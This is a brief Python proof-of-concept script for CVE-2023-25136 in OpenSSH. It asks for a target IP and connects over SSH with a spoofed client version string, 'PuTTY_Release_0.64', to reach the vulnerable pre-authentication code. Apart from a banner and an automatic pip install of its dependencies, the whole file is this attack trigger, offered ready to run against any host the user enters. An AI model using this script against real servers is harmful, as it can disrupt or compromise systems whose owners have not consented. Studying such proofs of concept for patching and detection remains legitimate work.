import os
import subprocess

try:
    import paramiko
    import colorama
    from colorama import Fore, Style
except ImportError:
    package = 'paramiko colorama'
    if os.name == 'nt':
        cmd = f'pip install {package}'
    elif os.name == 'posix':
        cmd = f'pip3 install {package}'
    else:
        print('Unknown OS')
        exit()

    subprocess.call(cmd.split())
    exit()


# Initialize colorama
colorama.init()

ascii_text = '''

   ██████╗ ██████╗ ███████╗███╗   ██╗███████╗███████╗██╗  ██╗     █████╗    ██╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██║  ██║    ██╔══██╗  ███║
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗███████╗███████║    ╚██████║  ╚██║
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║╚════██║╚════██║██╔══██║     ╚═══██║   ██║
  ╚██████╔╝██║     ███████╗██║ ╚████║███████║███████║██║  ██║     █████╔╝██╗██║
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝     ╚════╝ ╚═╝╚═╝
             '''
ascii_text += f"\n{Fore.MAGENTA}{Style.BRIGHT} CVE-2023-25136{Style.RESET_ALL}"
print(ascii_text)

print("")

target_ip = input("Enter the ip address to use: ")
CLIENT_ID = "PuTTY_Release_0.64"

def main():
    try:
        transport = paramiko.Transport(target_ip)
        transport.local_version = f"SSH-2.0-{CLIENT_ID}"
        transport.connect(username='', password='')
        print(f"{Fore.GREEN}Connected successfully!{Style.RESET_ALL}")
        transport.close()
    except Exception as e:
        print(f"{Fore.RED}Failed to connect: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
     main()
